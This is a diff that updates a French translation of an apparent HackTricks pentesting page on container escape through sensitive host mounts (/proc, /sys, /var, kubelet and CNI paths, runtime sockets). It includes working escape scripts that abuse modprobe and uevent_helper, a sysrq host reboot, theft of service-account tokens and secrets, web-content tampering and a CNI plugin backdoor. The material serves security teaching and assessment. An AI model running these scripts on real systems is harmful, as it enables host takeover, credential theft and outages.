@@ -1,18 +1,18 @@
-# Montages sensibles de l'hôte
+# Sensitive Host Mounts
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Aperçu
+## Overview
 
-Les montages de l'hôte sont l'une des surfaces d'attaque pratiques les plus importantes pour le container-escape car ils font souvent s'effondrer une vue de processus soigneusement isolée pour revenir à une visibilité directe des ressources de l'hôte. Les cas dangereux ne se limitent pas à `/`. Bind mounts de `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, ou des chemins liés aux périphériques peuvent exposer des contrôles du kernel, des credentials, les systèmes de fichiers des containers voisins, et des interfaces de gestion runtime.
+Les host mounts sont l’une des surfaces pratiques les plus importantes pour l’escape de container, car ils réduisent souvent une vue de processus soigneusement isolée à une visibilité directe des ressources de l’hôte. Les cas dangereux ne se limitent pas à `/`. Les bind mounts de `/proc`, `/sys`, `/var`, des runtime sockets, de l’état géré par kubelet, ou de chemins liés aux devices peuvent exposer des contrôles du kernel, des credentials, les filesystems de containers voisins et des interfaces de gestion du runtime.
 
-Cette page existe séparément des pages de protection individuelles parce que le modèle d'abus est transversal. Un writable host mount est dangereux en partie à cause des mount namespaces, en partie à cause des user namespaces, en partie à cause de la couverture AppArmor ou SELinux, et en partie à cause du chemin hôte exact qui a été exposé. Le traiter comme un sujet à part rend la surface d'attaque beaucoup plus facile à analyser.
+Cette page existe séparément des pages de protection individuelles parce que le modèle d’abus est transversal. Un host mount en écriture est dangereux en partie à cause des mount namespaces, en partie à cause des user namespaces, en partie à cause de la couverture AppArmor ou SELinux, et en partie à cause du chemin exact de l’hôte exposé. Le traiter comme un sujet à part rend la surface d’attaque beaucoup plus simple à comprendre.
 
-## Exposition de `/proc`
+## `/proc` Exposure
 
-procfs contient à la fois des informations de processus ordinaires et des interfaces de contrôle du kernel à fort impact. Un bind mount tel que `-v /proc:/host/proc` ou une vue du container qui expose des entrées proc inattendues en écriture peut donc conduire à une divulgation d'informations, un déni de service, ou une exécution directe de code sur l'hôte.
+procfs contient à la fois des informations ordinaires sur les processus et des interfaces de contrôle du kernel à fort impact. Un bind mount comme `-v /proc:/host/proc` ou une vue de container qui expose des entrées proc inattendues et inscriptibles peut donc conduire à une fuite d’informations, à un denial of service, ou à une exécution directe de code sur l’hôte.
 
-High-value procfs paths include:
+Les chemins procfs à forte valeur incluent :
 
 - `/proc/sys/kernel/core_pattern`
 - `/proc/sys/kernel/modprobe`
@@ -29,9 +29,9 @@ High-value procfs paths include:
 - `/proc/sched_debug`
 - `/proc/[pid]/mountinfo`
 
-### Abus
+### Abuse
 
-Commencez par vérifier quelles entrées procfs à haute valeur sont visibles ou en écriture :
+Commencez par vérifier quelles entrées procfs à forte valeur sont visibles ou inscriptibles :
 ```bash
 for p in \
 /proc/sys/kernel/core_pattern \
@@ -46,47 +46,47 @@ for p in \
 [ -e "$p" ] && ls -l "$p"
 done
 ```
-Ces chemins sont intéressants pour des raisons différentes. `core_pattern`, `modprobe` et `binfmt_misc` peuvent devenir des vecteurs d'exécution de code sur l'hôte lorsqu'ils sont écrits. `kallsyms`, `kmsg`, `kcore` et `config.gz` sont des sources de renseignement puissantes pour l'exploitation du noyau. `sched_debug` et `mountinfo` révèlent le contexte des processus, des cgroups et du système de fichiers, ce qui peut aider à reconstituer l'agencement de l'hôte depuis l'intérieur du conteneur.
+Ces chemins sont intéressants pour différentes raisons. `core_pattern`, `modprobe`, et `binfmt_misc` peuvent devenir des chemins d'exécution de code sur l'hôte lorsqu'ils sont inscriptibles. `kallsyms`, `kmsg`, `kcore`, et `config.gz` sont des sources puissantes de reconnaissance pour l'exploitation du kernel. `sched_debug` et `mountinfo` révèlent le contexte des process, des cgroup, et du filesystem qui peut aider à reconstituer la disposition de l'hôte depuis l'intérieur du container.
 
-La valeur pratique de chaque chemin est différente, et traiter tous comme s'ils avaient le même impact complique le triage :
+La valeur pratique de chaque chemin est différente, et les traiter tous comme s'ils avaient le même impact rend le triage plus difficile :
 
 - `/proc/sys/kernel/core_pattern`
-Si inscriptible, c'est l'un des chemins procfs les plus impactants parce que le noyau exécutera un pipe handler après un crash. Un conteneur capable de pointer `core_pattern` vers une charge utile stockée dans son overlay ou dans un chemin monté de l'hôte peut souvent obtenir une exécution de code sur l'hôte. Voir aussi [read-only-paths.md](protections/read-only-paths.md) pour un exemple dédié.
+Si inscriptible, c'est l'un des chemins procfs à plus fort impact, car le kernel exécutera un handler pipe après un crash. Un container qui peut pointer `core_pattern` vers un payload stocké dans son overlay ou dans un chemin monté de l'hôte peut souvent obtenir une exécution de code sur l'hôte. Voir aussi [read-only-paths.md](protections/read-only-paths.md) pour un exemple dédié.
 - `/proc/sys/kernel/modprobe`
-Ce chemin contrôle le helper en espace utilisateur utilisé par le noyau lorsqu'il doit invoquer la logique de chargement de modules. S'il est inscriptible depuis le conteneur et interprété dans le contexte de l'hôte, il peut devenir un autre primitif d'exécution de code sur l'hôte. Il est particulièrement intéressant lorsqu'il est combiné avec un moyen de déclencher le chemin du helper.
+Ce chemin contrôle le helper userspace utilisé par le kernel lorsqu'il doit invoquer la logique de chargement de module. S'il est inscriptible depuis le container et interprété dans le contexte de l'hôte, il peut devenir un autre primitive d'exécution de code sur l'hôte. Il est particulièrement intéressant lorsqu'il est combiné avec un moyen de déclencher le chemin du helper.
 - `/proc/sys/vm/panic_on_oom`
-Ce n'est généralement pas un primitif d'évasion propre, mais il peut convertir la pression mémoire en un déni de service à l'échelle de l'hôte en transformant les conditions OOM en comportement de panic du noyau.
+Ce n'est généralement pas une primitive d'évasion propre, mais cela peut transformer la pression mémoire en déni de service à l'échelle de l'hôte en convertissant les conditions OOM en comportement de kernel panic.
 - `/proc/sys/fs/binfmt_misc`
-Si l'interface d'enregistrement est inscriptible, l'attaquant peut enregistrer un handler pour une valeur magic choisie et obtenir une exécution dans le contexte de l'hôte lorsqu'un fichier correspondant est exécuté.
+Si l'interface d'enregistrement est inscriptible, l'attaquant peut enregistrer un handler pour une valeur magique choisie et obtenir une exécution dans le contexte de l'hôte lorsqu'un fichier correspondant est exécuté.
 - `/proc/config.gz`
-Utile pour le triage d'exploits du noyau. Il permet de déterminer quels sous-systèmes, mitigations et options du noyau sont activés sans avoir besoin des métadonnées de paquets de l'hôte.
+Utile pour le triage d'exploitation du kernel. Cela aide à déterminer quels subsystèmes, mitigations, et fonctionnalités optionnelles du kernel sont activés sans avoir besoin des métadonnées des paquets de l'hôte.
 - `/proc/sysrq-trigger`
-Majoritairement un chemin de déni de service, mais un chemin très sérieux. Il peut redémarrer, provoquer un panic ou perturber l'hôte immédiatement.
+Principalement un chemin de déni de service, mais un très sérieux. Il peut redémarrer, provoquer un panic, ou perturber l'hôte immédiatement.
 - `/proc/kmsg`
-Révèle les messages du ring buffer du noyau. Utile pour le fingerprinting de l'hôte, l'analyse de crashs, et, dans certains environnements, pour le leak d'informations utiles à l'exploitation du noyau.
+Révèle les messages du ring buffer du kernel. Utile pour l'empreinte de l'hôte, l'analyse de crash, et dans certains environnements pour divulguer des informations utiles à l'exploitation du kernel.
 - `/proc/kallsyms`
-Précieux lorsqu'il est lisible car il expose les symboles exportés du noyau et peut aider à contourner les hypothèses de randomisation des adresses lors du développement d'exploits noyau.
+Précieux lorsqu'il est lisible, car il expose les informations de symboles kernel exportés et peut aider à contourner les hypothèses de randomisation d'adresses lors du développement d'un exploit kernel.
 - `/proc/[pid]/mem`
-C'est une interface directe vers la mémoire d'un processus. Si le processus cible est accessible avec les conditions de type ptrace nécessaires, cela peut permettre de lire ou modifier la mémoire d'un autre processus. L'impact réaliste dépend fortement des identifiants, de hidepid, de Yama et des restrictions ptrace, donc c'est un chemin puissant mais conditionnel.
+Il s'agit d'une interface directe à la mémoire d'un process. Si le process cible est atteignable avec les conditions ptrace nécessaires, elle peut permettre de lire ou de modifier la mémoire d'un autre process. L'impact réaliste dépend fortement des credentials, de `hidepid`, de Yama, et des restrictions ptrace, donc c'est un chemin puissant mais conditionnel.
 - `/proc/kcore`
-Expose une vue de type image core de la mémoire système. Le fichier est énorme et peu pratique à utiliser, mais s'il est lisible de manière significative, cela indique une surface mémoire de l'hôte mal exposée.
+Expose une vue de la mémoire système de type image core. Le fichier est énorme et peu pratique à utiliser, mais s'il est réellement lisible, cela indique une surface mémoire de l'hôte mal exposée.
 - `/proc/kmem` and `/proc/mem`
-Interfaces mémoire brutes historiquement très impactantes. Sur de nombreux systèmes modernes elles sont désactivées ou fortement restreintes, mais si elles sont présentes et utilisables elles doivent être considérées comme des trouvailles critiques.
+Interfaces brutes à la mémoire historiquement à fort impact. Sur de nombreux systèmes modernes, elles sont désactivées ou fortement restreintes, mais si elles sont présentes et utilisables, elles doivent être traitées comme des findings critiques.
 - `/proc/sched_debug`
-Leaks des informations d'ordonnancement et de tâches qui peuvent exposer les identités des processus de l'hôte même lorsque d'autres vues de processus semblent plus propres que prévu.
+Divulgue des informations de scheduling et de tâches qui peuvent exposer les identités des process de l'hôte même lorsque les autres vues des process semblent plus propres que prévu.
 - `/proc/[pid]/mountinfo`
-Extrêmement utile pour reconstituer où le conteneur se trouve réellement sur l'hôte, quelles voies sont backing par un overlay, et si un mount inscriptible correspond à du contenu hôte ou seulement à la couche du conteneur.
+Extrêmement utile pour reconstituer où le container vit réellement sur l'hôte, quels chemins sont supportés par overlay, et si un mount inscriptible correspond à du contenu de l'hôte ou seulement à la couche du container.
 
-Si `/proc/[pid]/mountinfo` ou les détails de l'overlay sont lisibles, utilisez-les pour récupérer le chemin hôte du système de fichiers du conteneur :
+Si `/proc/[pid]/mountinfo` ou les détails d'overlay sont lisibles, utilisez-les pour récupérer le chemin hôte du filesystem du container :
 ```bash
 cat /proc/self/mountinfo | head -n 50
 mount | grep overlay
 ```
-Ces commandes sont utiles parce qu'un certain nombre d'astuces d'exécution sur l'hôte nécessitent de convertir un chemin à l'intérieur du conteneur en le chemin correspondant du point de vue de l'hôte.
+Ces commandes sont utiles, car un certain nombre de tricks d'exécution sur l'hôte nécessitent de transformer un path à l’intérieur du container en le path correspondant du point de vue de l'hôte.
 
-### Exemple complet : `modprobe` Helper Path Abuse
+### Full Example: `modprobe` Helper Path Abuse
 
-Si `/proc/sys/kernel/modprobe` est accessible en écriture depuis le conteneur et que le helper path est interprété dans le contexte de l'hôte, il peut être redirigé vers un payload contrôlé par l'attaquant :
+Si `/proc/sys/kernel/modprobe` est inscriptible depuis le container et que le path du helper est interprété dans le contexte de l'hôte, il peut être redirigé vers un payload contrôlé par l'attaquant:
 ```bash
 [ -w /proc/sys/kernel/modprobe ] || exit 1
 host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
@@ -98,31 +98,31 @@ chmod +x /tmp/modprobe-payload
 echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
 cat /proc/sys/kernel/modprobe
 ```
-Le déclencheur exact dépend de la cible et du comportement du noyau, mais l'important est qu'un chemin helper inscriptible peut rediriger un futur appel du helper du noyau vers du contenu host-path contrôlé par l'attaquant.
+Le déclencheur exact dépend de la cible et du comportement du kernel, mais le point important est qu’un chemin d’helper inscriptible peut rediriger une future invocation d’helper du kernel vers du contenu du host-path contrôlé par l’attaquant.
 
-### Exemple complet : Reconnaissance du noyau avec `kallsyms`, `kmsg`, et `config.gz`
+### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`
 
-Si l'objectif est d'évaluer l'exploitabilité plutôt que d'obtenir une évasion immédiate :
+Si l’objectif est l’évaluation de l’exploitabilité plutôt qu’une évasion immédiate :
 ```bash
 head -n 20 /proc/kallsyms 2>/dev/null
 dmesg 2>/dev/null | head -n 50
 zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
 ```
-Ces commandes aident à déterminer si des informations utiles sur les symboles sont visibles, si les messages récents du kernel révèlent un état intéressant, et quelles fonctionnalités ou mitigations du kernel sont compilées. L'impact n'est généralement pas une évasion directe, mais cela peut fortement raccourcir le triage des vulnérabilités du kernel.
+Ces commandes aident à répondre à la question de savoir si des informations de symboles utiles sont visibles, si des messages récents du kernel révèlent un état intéressant, et quelles fonctionnalités ou mitigations du kernel sont compilées. L’impact n’est généralement pas une évasion directe, mais cela peut réduire fortement le triage des vulnérabilités du kernel.
 
 ### Full Example: SysRq Host Reboot
 
-Si `/proc/sysrq-trigger` est accessible en écriture et atteint la host view:
+Si `/proc/sysrq-trigger` est accessible en écriture et atteint la vue de l’hôte :
 ```bash
 echo b > /proc/sysrq-trigger
 ```
-L'effet est un redémarrage immédiat de l'hôte. Ce n'est pas un exemple subtil, mais il montre clairement que l'exposition de procfs peut être bien plus grave qu'une simple divulgation d'informations.
+L’effet est immédiat : reboot de l’hôte. Ce n’est pas un exemple subtil, mais il démontre clairement que l’exposition de procfs peut être bien plus grave qu’une simple divulgation d’informations.
 
-## Exposition de `/sys`
+## `/sys` Exposure
 
-sysfs expose de grandes quantités d'état du kernel et des périphériques. Certains chemins sysfs sont principalement utiles pour le fingerprinting, tandis que d'autres peuvent affecter l'exécution des helpers, le comportement des périphériques, la configuration des security-modules, ou l'état du firmware.
+sysfs expose de grandes quantités d’état du kernel et des devices. Certains chemins sysfs sont surtout utiles pour le fingerprinting, tandis que d’autres peuvent affecter l’exécution des helpers, le comportement des devices, la configuration des security-modules ou l’état du firmware.
 
-High-value sysfs paths include:
+Les chemins sysfs à forte valeur incluent :
 
 - `/sys/kernel/uevent_helper`
 - `/sys/class/thermal`
@@ -132,9 +132,9 @@ High-value sysfs paths include:
 - `/sys/firmware/efi/efivars`
 - `/sys/kernel/debug`
 
-Ces chemins sont importants pour différentes raisons. `/sys/class/thermal` peut influencer le comportement de gestion thermique et donc la stabilité de l'hôte dans des environnements fortement exposés. `/sys/kernel/vmcoreinfo` peut leak des informations de crash-dump et d'agencement du kernel qui aident au fingerprinting de bas niveau de l'hôte. `/sys/kernel/security` est l'interface `securityfs` utilisée par les Linux Security Modules, donc un accès inattendu peut exposer ou modifier l'état lié au MAC. Les chemins des variables EFI peuvent affecter les paramètres de boot gérés par le firmware, ce qui les rend bien plus sérieux que de simples fichiers de configuration. `debugfs` sous `/sys/kernel/debug` est particulièrement dangereux car il s'agit intentionnellement d'une interface orientée développeur avec beaucoup moins d'attentes de sécurité que les APIs kernel destinées à la production durcies.
+Ces chemins comptent pour différentes raisons. `/sys/class/thermal` peut influencer le comportement de la gestion thermique et donc la stabilité de l’hôte dans des environnements mal exposés. `/sys/kernel/vmcoreinfo` peut leak des informations de crash-dump et de layout du kernel qui aident au fingerprinting bas niveau de l’hôte. `/sys/kernel/security` est l’interface `securityfs` utilisée par Linux Security Modules, donc un accès inattendu peut exposer ou modifier l’état lié à MAC. Les chemins de variables EFI peuvent affecter les paramètres de boot stockés dans le firmware, ce qui les rend beaucoup plus sérieux que des fichiers de configuration ordinaires. `debugfs` sous `/sys/kernel/debug` est particulièrement dangereux car il s’agit volontairement d’une interface orientée développeur, avec beaucoup moins d’exigences de sécurité que les APIs du kernel durcies et destinées à la production.
 
-Useful review commands for these paths are:
+Les commandes utiles pour examiner ces chemins sont :
 ```bash
 find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
 find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
@@ -142,17 +142,17 @@ find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
 find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
 cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
 ```
-What makes those commands interesting:
+Ce qui rend ces commandes intéressantes :
 
-- `/sys/kernel/security` may reveal whether AppArmor, SELinux, or another LSM surface is visible in a way that should have stayed host-only.
-- `/sys/kernel/debug` is often the most alarming finding in this group. If `debugfs` is mounted and readable or writable, expect a wide kernel-facing surface whose exact risk depends on the enabled debug nodes.
-- EFI variable exposure is less common, but if present it is high impact because it touches firmware-backed settings rather than ordinary runtime files.
-- `/sys/class/thermal` is mainly relevant for host stability and hardware interaction, not for neat shell-style escape.
-- `/sys/kernel/vmcoreinfo` is mainly a host-fingerprinting and crash-analysis source, useful for understanding low-level kernel state.
+- `/sys/kernel/security` peut révéler si AppArmor, SELinux, ou une autre surface LSM est visible d’une manière qui aurait dû rester côté hôte uniquement.
+- `/sys/kernel/debug` est souvent la découverte la plus alarmante dans ce groupe. Si `debugfs` est monté et lisible ou inscriptible, attendez-vous à une large surface orientée kernel dont le risque exact dépend des nœuds de débogage activés.
+- L’exposition des variables EFI est moins courante, mais si elle est présente, son impact est élevé car elle touche des paramètres soutenus par le firmware plutôt que de simples fichiers d’exécution ordinaires.
+- `/sys/class/thermal` est surtout pertinente pour la stabilité de l’hôte et l’interaction avec le matériel, pas pour un neat shell-style escape.
+- `/sys/kernel/vmcoreinfo` est surtout une source de host-fingerprinting et d’analyse de crash, utile pour comprendre l’état bas niveau du kernel.
 
-### Exemple complet : `uevent_helper`
+### Full Example: `uevent_helper`
 
-Si `/sys/kernel/uevent_helper` est writable, le kernel peut exécuter un helper contrôlé par un attaquant lorsqu'un `uevent` est déclenché :
+Si `/sys/kernel/uevent_helper` est inscriptible, le kernel peut exécuter un helper contrôlé par un attaquant lorsqu’un `uevent` est déclenché :
 ```bash
 cat <<'EOF' > /evil-helper
 #!/bin/sh
@@ -166,11 +166,11 @@ cat /output
 ```
 La raison pour laquelle cela fonctionne est que le chemin du helper est interprété du point de vue de l'hôte. Une fois déclenché, le helper s'exécute dans le contexte de l'hôte plutôt qu'à l'intérieur du container actuel.
 
-## `/var` Exposition
+## ` /var` Exposure
 
-Monter le `/var` de l'hôte dans un container est souvent sous-estimé car cela ne semble pas aussi spectaculaire que de monter `/`. En pratique, cela peut suffire pour atteindre les runtime sockets, les répertoires de snapshots de container, les volumes de pod gérés par kubelet, les projected service-account tokens, et les systèmes de fichiers d'applications voisins. Sur les nœuds modernes, `/var` est souvent l'endroit où se trouve l'état des containers le plus intéressant d'un point de vue opérationnel.
+Monter `/var` de l'hôte dans un container est souvent sous-estimé parce que cela ne paraît pas aussi spectaculaire que monter `/`. En pratique, cela peut suffire pour atteindre des runtime sockets, des répertoires de snapshot de container, des volumes de pod gérés par kubelet, des projected service-account tokens, et les systèmes de fichiers des applications voisines. Sur les nœuds modernes, `/var` est souvent l'endroit où se trouve réellement l'état de container le plus intéressant sur le plan opérationnel.
 
-### Kubernetes Exemple
+### Kubernetes Example
 
 Un pod avec `hostPath: /var` peut souvent lire les projected tokens d'autres pods et le contenu des snapshots overlay:
 ```bash
@@ -178,36 +178,86 @@ find /host-var/ -type f -iname '*.env*' 2>/dev/null
 find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
 cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
 ```
-Ces commandes sont utiles car elles permettent de déterminer si le mount n'expose que des données applicatives banales ou des cluster credentials à fort impact. Un service-account token lisible peut immédiatement transformer local code execution en un accès à la Kubernetes API.
+Ces commandes sont utiles car elles permettent de répondre à la question de savoir si le mount expose seulement des données d'application peu sensibles ou des credentials de cluster à fort impact. Un token de service-account lisible peut immédiatement transformer une local code execution en accès à Kubernetes API.
 
-Si le token est présent, vérifiez ce à quoi il donne accès plutôt que de vous arrêter à la simple découverte du token :
+Si le token est présent, validez ce qu’il peut atteindre au lieu de vous arrêter à sa découverte du token :
 ```bash
 TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
 curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
 ```
-L'impact ici peut être bien plus important que l'accès local au nœud. Un token avec un RBAC étendu peut transformer un montage de `/var` en compromission à l'échelle du cluster.
+L'impact ici peut être bien plus important qu'un accès local au node. Un token avec un RBAC large peut transformer un `/var` monté en compromission à l'échelle du cluster.
 
-### Exemple Docker et containerd
+### Docker And containerd Example
 
-Sur les hôtes Docker, les données pertinentes se trouvent souvent sous `/var/lib/docker`, tandis que sur des nœuds Kubernetes fonctionnant avec containerd, elles peuvent se trouver sous `/var/lib/containerd` ou sous des chemins spécifiques au snapshotter :
+Sur les hôtes Docker, les données pertinentes se trouvent souvent sous `/var/lib/docker`, tandis que sur les nodes Kubernetes basés sur containerd, elles peuvent se trouver sous `/var/lib/containerd` ou dans des chemins spécifiques au snapshotter :
 ```bash
 docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
 find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
 find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
 ```
-Si le `/var` monté expose le contenu d'un snapshot modifiable en écriture d'une autre charge de travail, l'attaquant peut être en mesure de modifier des fichiers d'application, déposer du contenu web, ou changer des scripts de démarrage sans toucher à la configuration actuelle du conteneur.
+Si le `/var` monté expose du contenu de snapshot inscriptible d’un autre workload, l’attaquant peut être en mesure de modifier des fichiers d’application, de déposer du web content, ou de changer des startup scripts sans toucher à la configuration du conteneur actuel.
 
-Idées concrètes d'abus une fois que du contenu de snapshot modifiable en écriture est trouvé :
+Idées d’abus concrètes une fois un contenu de snapshot inscriptible trouvé :
 ```bash
 echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
 grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
 find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
 ```
-Ces commandes sont utiles car elles montrent les trois principales familles d'impact d'un `/var` monté : altération de l'application, récupération de secrets et mouvement latéral vers des charges de travail voisines.
+Ces commandes sont utiles car elles montrent les trois principales familles d’impact des `/var` montés : altération d’application, récupération de secrets, et mouvement latéral vers les workloads voisins.
 
-## Sockets d'exécution
+## Kubelet State, Plugins, And CNI Paths
 
-Les montages d'hôtes sensibles incluent souvent des sockets d'exécution plutôt que des répertoires complets. Ces derniers sont si importants qu'ils méritent d'être mentionnés explicitement ici :
+Un mount de `/var/lib/kubelet`, `/opt/cni/bin`, ou `/etc/cni/net.d` est souvent exposé via des DaemonSets privilégiés, des agents CNI, des plugins CSI node, des opérateurs GPU, et des assistants de stockage. Ces mounts sont faciles à écarter comme de la simple "node plumbing", mais ils se trouvent directement dans le chemin d’exécution des nouveaux pods et contiennent souvent des identifiants kubelet, des secrets projetés, des sockets d’enregistrement, et des binaires de plugins host-side exécutables.
+
+Les cibles à forte valeur incluent :
+
+- `/var/lib/kubelet/pki`
+- `/var/lib/kubelet/pods`
+- `/var/lib/kubelet/device-plugins/kubelet.sock`
+- `/var/lib/kubelet/pod-resources/kubelet.sock`
+- `/var/lib/kubelet/plugins`
+- `/var/lib/kubelet/plugins_registry`
+- `/opt/cni/bin`
+- `/etc/cni/net.d`
+
+Les commandes utiles de revue sont :
+```bash
+find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
+egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
+ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
+find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
+grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
+```
+Pourquoi ces chemins sont importants :
+
+- `/var/lib/kubelet/pki` peut exposer les certificats client kubelet et d'autres identifiants locaux du node qui peuvent parfois être réutilisés contre le API server ou les endpoints TLS côté kubelet, selon la conception du cluster.
+- `/var/lib/kubelet/pods` contient souvent des service-account tokens projetés et des Secrets montés pour des pods voisins sur le même node.
+- `/var/lib/kubelet/pod-resources/kubelet.sock` est surtout une surface de reconnaissance, mais très utile : il révèle quels pods et containers possèdent actuellement des GPUs, hugepages, des devices SR-IOV, et d'autres ressources locales rares du node.
+- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, et `/var/lib/kubelet/plugins_registry` révèlent quels plugins CSI, DRA, et device plugins sont installés et quels sockets le kubelet est censé contacter. Si ces répertoires sont inscriptibles plutôt que simplement lisibles, la découverte devient beaucoup plus grave.
+- `/opt/cni/bin` et `/etc/cni/net.d` se trouvent directement sur le chemin de configuration du pod-network. Un accès en écriture à cet endroit est souvent une primitive d'exécution différée sur le host plutôt qu'une simple exposition de configuration.
+
+### Full Example: Writable `/opt/cni/bin`
+
+Si un répertoire de binaires CNI du host est monté en lecture-écriture, remplacer un plugin peut suffire à obtenir une exécution sur le host la prochaine fois que le kubelet crée un pod sandbox sur ce node :
+```bash
+plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
+grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
+[ -n "$plugin" ] || exit 1
+mv "$plugin" "${plugin}.orig"
+cat <<'EOF' > "$plugin"
+#!/bin/sh
+id > /tmp/cni-triggered
+exec "$(dirname "$0")/$(basename "$0").orig" "$@"
+EOF
+chmod +x "$plugin"
+echo "wait for the next pod scheduled on this node"
+```
+Ce n’est pas aussi immédiat qu’un `docker.sock` monté, mais c’est souvent plus réaliste dans des pods d’infrastructure Kubernetes compromis. Le point important est que le binaire modifié est ensuite exécuté par le flux de configuration du réseau hôte, et non par le conteneur actuel.
+
+
+## Runtime Sockets
+
+Les sensitive host mounts incluent souvent des runtime sockets plutôt que des répertoires complets. Ils sont si importants qu’ils méritent d’être répétés explicitement ici :
 ```text
 /run/containerd/containerd.sock
 /var/run/crio/crio.sock
@@ -216,40 +266,48 @@ Les montages d'hôtes sensibles incluent souvent des sockets d'exécution plutô
 /var/run/kubelet.sock
 /run/firecracker-containerd.sock
 ```
-Voir [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) pour les flux d'exploitation complets une fois qu'un de ces sockets est monté.
+Voir [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) pour les flows complets d’exploitation une fois qu’un de ces sockets est monté.
 
-Voici un premier modèle d'interaction rapide :
+Comme premier pattern d’interaction rapide :
 ```bash
 docker -H unix:///host/run/docker.sock version 2>/dev/null
 ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
 crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
 ```
-Si l'une d'elles réussit, le chemin depuis "mounted socket" jusqu'à "start a more privileged sibling container" est généralement beaucoup plus court que pour n'importe quel kernel breakout.
+Si l’un de ceux-ci réussit, le chemin allant de "mounted socket" à "start a more privileged sibling container" est généralement beaucoup plus court que n’importe quel chemin de kernel breakout.
 
-## CVE liées aux montages
+## Mount-Related CVEs
 
-Les montages sur l'hôte croisent aussi des vulnérabilités runtime. Des exemples récents importants incluent :
+Les host mounts interagissent aussi avec les vulnérabilités du runtime. Exemples récents importants :
 
-- `CVE-2024-21626` dans `runc`, où un leaked descripteur de fichier de répertoire pourrait placer le répertoire de travail sur le système de fichiers de l'hôte.
-- `CVE-2024-23651` et `CVE-2024-23653` dans BuildKit, où OverlayFS copy-up races pourraient produire des écritures sur des chemins hôtes pendant les builds.
-- `CVE-2024-1753` dans les flux de build Buildah et Podman, où des bind mounts spécifiquement conçus pendant le build pourraient exposer `/` en lecture-écriture.
-- `CVE-2024-40635` dans containerd, où une grande valeur `User` pourrait déborder et aboutir à un comportement équivalent à UID 0.
+- `CVE-2024-21626` dans `runc`, où un directory file descriptor divulgué pouvait placer le working directory sur le host filesystem.
+- `CVE-2024-23651`, `CVE-2024-23652` et `CVE-2024-23653` dans BuildKit, où des Dockerfiles malveillants, des frontends et des flux `RUN --mount` pouvaient réintroduire l’accès aux fichiers du host, la suppression ou des privilèges élevés pendant les builds.
+- `CVE-2024-1753` dans Buildah et les build flows de Podman, où des bind mounts forgés pendant le build pouvaient exposer `/` en read-write.
+- `CVE-2025-47290` dans `containerd` 2.1.0, où un TOCTOU pendant le image unpack pouvait permettre à une image spécialement forgée de modifier le host filesystem pendant le pull.
 
-Ces CVE sont importantes ici car elles montrent que la gestion des montages ne se limite pas à la configuration de l'opérateur. Le runtime lui-même peut aussi introduire des conditions d'évasion induites par les montages.
+Ces CVEs sont importantes ici car elles montrent que la gestion des mounts ne dépend pas seulement de la configuration de l’opérateur. Le runtime lui-même peut aussi introduire des conditions d’évasion liées aux mounts.
 
-## Vérifications
+## Checks
 
-Utilisez ces commandes pour repérer rapidement les expositions de montages à plus forte valeur :
+Utilisez ces commandes pour repérer rapidement les mount exposures les plus intéressantes :
 ```bash
 mount
 find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
 find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
+find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
+ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
 find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
 find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
 ```
 Ce qui est intéressant ici :
 
-- La racine de l'hôte, `/proc`, `/sys`, `/var` et les sockets d'exécution sont toutes des découvertes à haute priorité.
-- Les entrées proc/sys inscriptibles signifient souvent que le montage expose des contrôles du noyau globaux de l'hôte plutôt qu'une vue sécurisée du conteneur.
-- Les chemins `/var` montés méritent une revue des identifiants et des charges de travail voisines, pas seulement du système de fichiers.
+- Host root, `/proc`, `/sys`, `/var`, et les runtime sockets sont tous des findings à haute priorité.
